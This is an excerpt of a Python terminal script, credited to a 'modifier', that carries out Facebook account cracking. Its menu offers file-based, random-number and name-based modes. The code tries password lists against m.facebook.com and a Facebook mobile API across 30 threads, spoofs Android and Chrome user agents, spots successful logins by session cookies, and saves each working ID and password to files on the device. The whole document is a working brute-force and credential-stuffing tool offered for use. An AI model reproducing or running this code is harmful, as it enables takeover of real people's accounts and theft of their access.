...
\033[1;91m _|_|_|_|  _|_|_|_|  _|_|_|\033[1;91m
 ...
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ┃ [\033[1;91m✓\033[1;92m] MODIFIER   \033[1;91m: \033[1;92mXLXEDXXX
 ...
 ┃ [\033[1;91m✓\033[1;92m] CURRENT VERSION\033[1;91m: \033[1;92m0.1         
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
...
def Spy():
	clear()
	print(f" [1] Fɪʟᴇ Cʀᴀᴄᴋ")
	print(f" [2] Rᴀɴᴅᴏᴍ Cʀᴀᴄᴋɪɴɢ")
	print(f" [3] Gᴍᴀɪʟ Cʀᴀᴄᴋɪɴɢ")
	print(f" [0] Exɪᴛ")
	me=input(f'\n [?] Cʜᴏᴏsᴇ : ')
	if me in ["2", "02"]:
		bd()
	...
	if me in ["1", "01","11","A","a"]:
		clear()
		file = input(f' [?] Pᴜᴛ Fɪʟᴇ Pᴀᴛʜ\033[1;37m: ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print(f' \033[1;31m[!] ғɪʟᴇ ʟᴏᴄᴀᴛɪᴏɴ ᴡᴀs ɴᴏᴛ ғᴏᴜɴᴅ ')
			exit()
		os.system('clear')
		print(logo)
		print(f' [1] Method 1 \n [2] Method 2 \n [3] Method 3 \n [4] Method 4')
		...
		plist=[]
		try:
			ps_limit = int(input(f'\n [?] ʜᴏᴡ ᴍᴀɴʏ ᴘᴀssᴡᴏʀᴅs ᴅᴏ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴀᴅᴅ ? : '))
		except:
			ps_limit =1
		os.system('clear')
		print(logo)
		print(f'\033[1;32m [+] ᴇxᴀᴍᴘʟᴇ : first last,firtslast,first123\n')
		for i in range(ps_limit):
			plist.append(input(f' [?] Put password {i+1}: '))
	 
		cx=input(f'\n [?] ᴅᴏ ʏᴏᴜ ᴡᴀɴᴛ ᴄᴘ ᴀᴄᴄᴏᴜɴᴛ? (y/n): ')
		...
		with tred(max_workers=30) as crack_submit:
			...
			print(f' ᴛᴏᴛᴀʟ ɴɪᴍᴏ ɴɢᴀ ʙᴀʙᴀʏᴇ : \033[1;32m'+total_ids+f' \n \033[1;37mMethod : \033[1;37mM{mthd}')
			print(f"\033[1;37m ᴜsᴇ ғʟɪɢʜᴛ ᴍᴏᴅᴇ ғᴏʀ sᴘᴇᴇᴅ ᴜᴘ \033[1;37m")
			linex()
			for user in fo:
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/LEDf,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'nLEDgate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [LED-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/LED-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [LED-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/LED-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [LED] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua_string = f'DLEDk/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [LED-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/LED-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def bd():
                ...
                clear()
                pcp.append(f'y')
                print('\033[1;32m [+] ᴇxᴀᴍᴘʟᴇ: 017, 018, 019, 013, 016')
                linex()
                code = input('\033[1;37m [?] Put code: ')
                try:
                        limit = int(input('\n\033[1;32m [+] ᴇxᴀᴍᴘʟᴇ: 3000, 5000, 10000, 50000\n\033[1;37m [?] Put limit: '))
                except ValueError:
                        limit = 5000
                ...
                with tred(max_workers=30) as sat:     
                        clear()
                        tl = str(len(user))
                        print(f'\033[1;37m [+] Tᴏᴛᴀʟ ɴɪᴍᴏ ɴɢᴀ ʙᴀʙᴀʏᴇ : \033[1;32m'+tl)
                        print(f'\033[1;37m [+] ᴄʜᴏɪᴄᴇ ᴄᴏᴅᴇ :\033[1;32m '+code)
                        print(f'\033[1;37m [+] ᴘʀᴏᴄᴇss ʜᴀs sᴛᴀʀᴛᴇᴅ\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                ...
                print('\033[1;37m')
                linex()
                print(' ᴛʜᴇ ᴘʀᴏᴄᴇss ʜᴀs ᴄᴏᴍᴘʟᴇᴛᴇᴅ.')
                print(' ᴛᴏᴛᴀʟ OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def gml():
                ...
                clear()
                pcp.append(f'y')
                print('\033[1;32m ɴᴀᴍᴇ  ᴇxᴀᴍᴘʟᴇ:  Shahin, Sabbir, Forhad ')
                code = input(' First name : ')
                print(' ɴᴀᴍᴇ ᴇxᴀᴍᴘʟᴇ : Alam, hossen, hossain')
                codex = input(' Last name : ')
                try:
                        limit = int(input('\033[1;32m ᴇxᴀᴍᴘʟᴇ: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                ...
                with tred(max_workers=30) as sat:     
                        clear()
                        tl = str(len(user))
                        print(' ᴛᴏᴛᴀʟ ɴɪᴍᴏɴɢ ʙᴀʙᴀʏᴇ : \033[1;32m'+tl)
                        print(f'\033[1;37m ᴄʜᴏɪᴄᴇ ᴄᴏᴅᴇ ..:\033[1;32m '+code)
                        print(f'\033[1;32m ʀᴀɴᴅᴏᴍ ᴛᴇsᴛɪɴɢ ᴠᴇʀsɪᴏɴ ..... ')
                        print(f'\033[1;37m \x1b[38;5;126m ᴘʀᴏᴄᴇss sᴛᴀʀᴛᴇᴅ\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+codex+psx
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			'method': 'POST',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/LEDf,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '"Google Chrome";v="100", "Not)A;Brand";v="99", "Chromium";v="100"',
			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'nLEDgate',
			'sec-fetch-site': 'none',
			'sec-fetch-user': '?1',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[LED-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[LED-CP] '+idf+' | '+ps+'\033[0;97m')
